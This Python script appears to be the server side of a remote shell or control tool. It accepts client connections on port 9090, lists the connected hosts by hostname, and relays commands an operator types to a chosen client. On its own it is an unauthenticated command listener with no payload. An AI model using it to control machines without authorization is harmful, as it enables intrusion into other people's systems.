# server

import socket
import sys
import time
import threading


class Server(object):

    def __init__(self):
        self.host = ''  # local host
        self.port = 9090
        self.socket = None
        self.clients = []
        self.client_address = []

    def create_server(self):
        try:
            self.socket = socket.socket()
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            print('Server started.')
            return True
        except socket.error as e:
            print("socket creation failed " + str(e))
            time.sleep(5)
            self.create_server()

    def start_server(self):
        while 1:
            try:
                #print("Server: waiting for new connection")
                conn, address = self.socket.accept() # client connected 

                client_hostname = conn.recv(1024).decode('utf-8')
                #print('{} {} connected '.format(client_hostname, address))
                addr_host = address + (client_hostname,)
                self.clients.append((conn,addr_host)) # add client info to list 

            except socket.error as e:
                print("Error accepting a new connection " + str(e))
    
    def send_commands(self,client):
        # first send a join command 
        cmd = 'join'
        while True:
            client.send(cmd.encode())
            if cmd == 'quit':
                break
            response = str(client.recv(1024),"utf-8")
            print(response, end="")
            cmd = input()


def start_server(server):
    server.create_server()
    server.start_server()


def process_client(server):
    while True:
        if not server.clients: # no clients available
            print('.',end="")
            time.sleep(1)
            sys.stdout.flush()
            continue
        print()
        for i, item in enumerate(server.clients):
            print(i, item[1])
        cmd = input('Select your client : ')
        if cmd == 'r':
            continue
        client = server.clients[int(cmd)]
        server.send_commands(client[0])



def main():
    server = Server()
    listener_thread = threading.Thread(target=start_server, args=(server,))
    listener_thread.daemon = True # thread dies when main thread exits
    listener_thread.start()

    worker_thread = threading.Thread(target=process_client, args=(server,))
    worker_thread.daemon = True
    worker_thread.start()

    listener_thread.join() # we don't need to exit till both threads are done.
    worker_thread.join()  

    

main()